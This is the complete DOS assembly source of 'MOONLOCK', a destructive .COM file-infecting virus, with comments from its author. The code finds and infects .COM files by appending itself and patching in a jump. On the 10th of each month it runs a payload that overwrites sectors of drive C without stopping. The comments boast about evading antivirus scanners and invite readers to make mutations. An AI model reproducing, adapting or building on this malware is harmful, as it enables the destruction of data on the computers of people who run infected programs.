

; V.C.M - VERY CREATIVE MOTHERFUCKER - PRESETS
;***************************** MOONLOCK v1.1 **********************************
;VIRUS NAME  : MOON LOCK 1.0b
;CODED BY    : HumpingMac/V.C.M
;VIRUS ATTRIB: NOCI,NR,GS(Non overwriting COM. Infector,Non RES,Good Spread)
;RATING      : Medium(Just Your Regular Destructive Virus)
;POP TIME    : 10th Of Every Month Just Look at REDEEMING....
;BUGS        : In An empty ROOT DIR it halts,it changes the CURR DIR.
;SIZE        : 493b
;ASSEMBLING  : Tasm MOONLOCK.asm /m / Tlink MOONLOCK.OBJ /t
;UV-REPORT   : TNTVIRUS    - No Detection
;              VA3         - No Detection
;              Macfee SCAN - Guess....No detection
;              TBSCAN      - Unknow Virus Related To ASH...(One Smart Mother
;                            Fucker....)

CODE Segment Para

     Assume CS:Code;DS:Code

     Org 100h



;******************** Mem Location FixUp... *******************
main Proc     
start:Call Nxt
Nxt: pop BP
     sub BP,103h ;BP = Start Offset
;******************** Infect Programs **********************
         mov bx,Word Ptr[Offset BACKVAL+BP];Save Old Instruction Value
         mov Word ptr[Offset SWAPBUF+BP],bx;Cuz Its About To Be Changed
         mov bh,Byte Ptr[Offset BACKVAL+BP+2]
         mov Byte Ptr[Offset SWAPBUF+BP+2],bh
         mov Byte ptr[Offset ExitOnce+BP],0
         mov Byte ptr[Offset Gexit+BP],0
         mov ah,1Ah ;Set DTA to BUF
         lea dx,[offset Buf+BP]
         int 21h

SeekSt:   mov ah,4Eh ;Find First
          mov cx,0020h
          lea dx,[BP+offset ComsPec]
          int 21h
          Jc ChDir
          jmp InfectFile
FirstFile:mov ah,4Fh ;Find Next
          int 21h
          Jc ChDir
          jmp InfectFile
ChDir    :cmp Byte ptr[Offset Gexit+BP],3
          jne Skiper
          Jmp return
    Skiper:call RndChDir
          jmp Seekst
Infectfile:
           mov ax,word ptr [offset buf+1Ah+BP]
           mov Word ptr [Offset filesize+BP],ax

           mov ax,3D02h      ; open file to XS
           lea dx,[offset Buf+BP+1eh];returns handle to var
           int 21h
           mov Word Ptr [Offset filehndl+BP],ax

           mov ax,5700h ;Get Time/Date Infection Check....
           mov bx,word ptr[offset filehndl+BP]
           int 21h

           cmp cx,1111
           jne Luck
           Jmp NoLuck
    Luck:  mov ah,3Fh          ;read data...
           mov bx,Word Ptr [Offset filehndl+BP]
           mov cx,3
           lea dx,[offset BACKVAL+BP];Save Old Instruction
           int 21h

           mov ax,4200h ;Set file pointer to the start of Victim file
           mov bx,Word Ptr [Offset filehndl+BP]
           mov cx,0000
           mov dx,0000
           int 21h

           mov Byte ptr [Offset Buf2+BP],0e9h  ;Write JMP to EOF (E9 xx:xx
           mov ax,Word Ptr [Offset FileSize+BP]
           sub ax,3
           mov Word Ptr [Offset Buf2+BP+1],ax

           mov ah,40h;Write DATA
           mov bx,Word Ptr [Offset filehndl+BP]
           mov cx,3
           lea dx,[offset buf2+BP]
           int 21h

           mov ax,4202h;moves file pointer to EOF
           mov cx,0000
           mov dx,0000
           mov bx,[Offset filehndl+BP]
           int 21h

           mov ah,40h;Writes Virus...
           mov bx,Word Ptr [Offset filehndl+BP]
           mov cx,Offset EOF-100h;Size ???
           lea dx,[Offset start+BP]
           int 21h

           mov ax,5701h;Set Time/Date To Detect Infection..
           mov cx,1111
           mov bx,word ptr[offset filehndl+BP]
           int 21h
           inc Word Ptr [Offset ExitOnce+BP]
   NoLuck: mov ah,3eh;Close File...
           mov bx,Word Ptr [offset FileHndl+BP]
           int 21h
           cmp Word ptr [Offset ExitOnce+BP],3
           je return
           jmp FirstFile

   return:
                call DAYCHECK ;heres one mean MAMAFUCKER!
                mov ax,Word ptr[Offset SWAPBUF+BP]
                mov CS:[100h],ax
                mov ah,Byte ptr[Offset SWAPBUF+BP+2]
                mov CS:[102h],ah;Restore Old Instructions
                mov	ah,1ah			  ;Set DTA address ...
		mov	dx,80h			  ; ... to default DTA
		int	21h			  ;Call DOS to set DTA
		xor	ax,ax			  ;AX= 0
		mov	cx,ax			  ;BX= 0
		mov	bx,ax			  ;CX= 0
		mov	dx,ax			  ;DX= 0
		mov	di,ax			  ;SI= 0
		mov	si,ax			  ;DI= 0
		mov	sp,0FFFEh		  ;SP= 0
		mov	bp,100h 		  ;BP= 100h (RETurn addr)
		push	bp			  ; Put on stack
		mov	bp,ax			  ;BP= 0
		ret				  ;JMP to 100h (Fake A call)

;******************** Party Time check.... *****************************
RndChDir Proc
     inc Byte Ptr [Offset GExit+BP]
     mov ah,2ch
     int 21h
     mov di,0000
     mov dh,00
     add dx,2
 ReS:push dx
     mov ah,4Eh ;Find First
     mov cx,0010h;Suppose to a DIR ATTRIB BYTE but it just doesnt work!!!
     lea dx,[BP+offset DotDot]
     int 21h
     pop dx ; DIR is ignored(can in a case of a root dir with no dir cuase a halt...)
     cmp byte ptr[offset BUf+15h+BP],10h
     jne NxtDir
     inc di 
     cmp di,dx
     je EndFun
NxtDir:mov ah,4fh
       int 21h
       jc Res
       cmp byte ptr[Offset Buf+15h+BP],10h
       jne NxtDir
       inc di
       cmp di,dx
       jne NxtDir
EndFun:mov ah,3bh
       lea dx,[Offset Buf+BP+1eh]
       int 21h
       ret
RndChDir Endp
DAYCHECK PROC
  	mov ah,2ah	 ;
 	int 21h		 ; Dos to your service..
 	cmp dl,10	 ; Check if it's the forbidden night..
 	je  REDEEMING	 ; If yes, have a great fuck..
 	ret	         ; I know I know its for he's own good...

REDEEMING:				; PARTY TIME!
	cli				; Nobody can save'ya now!
        mov di,0000                     ;
  REFUCK:mov al,2                       ;Nail that drive C
         mov bx,0000                    ;shit full disk!
         mov cx,700                     ;Write 700!!! Sectors
         mov dx,di
         int 26h                        ;Call DOS for the Job
         add di,700                     ;Pointless yet, FUN!
         jmp REFUCK                     ;No IMAGE can save'ya now!

DAYCHECK endp
    ComSpec  db "*.com",0 ;ASCIIZ string of .COM FileSpec
    DotDot   db "*.*",0 
    VCMSt    db "V.C.M"
    ExitOnce db (0);File Infection Count
    FileSize DW 0
    FileHndl Dw 0;File Hndl
    Buf      DB 43 Dup (0);DTA Buf
    Buf2     DB 3 Dup (0)
    GExit    DB (0);Number Of Change Dir Calls
    BACKVAL  DB 3 Dup (0) ;Original Instruction Value
    SWAPBUF  DB 3 Dup (0) ;tmp swap buf
ChkDate:
EOF:
main endp

code ends

end main

;Welp That Raps It Up I can't say This Virus Was Well Writing Or Crap Like That
;But I Will Say This :
;A.This SHIT WORKS - FACT (execpt for the bugs listed above)
;B.This Is A Shitty Virus A Basic Code To Learn From And i'm sure it would not
;  Crash More than 50 Systems In Release Zone...So Way Try To Make It Perfect??
;U're Free To Create Mutations Of This Virus(Just Add Some DB ?? And Swap Jump
;Places...) But Ya'Know Who To Credit....*HumpingMac*
;WARNING THIS VIRUS WAS CREATED FOR TEST ONLY RELEASING THIS VIRUS OR ANY PART
;OR MUTATION OF IT IS OFF MY RESPONSIBILITY - IT WAS ONLY MENT TO SHOW HOW EASY
;IT's TO MAKE VIRUSES AND CRASH SYSTEMS SO IF YOU RELEASE IT - UP YOURS 
;I'm NOT TO BLAME




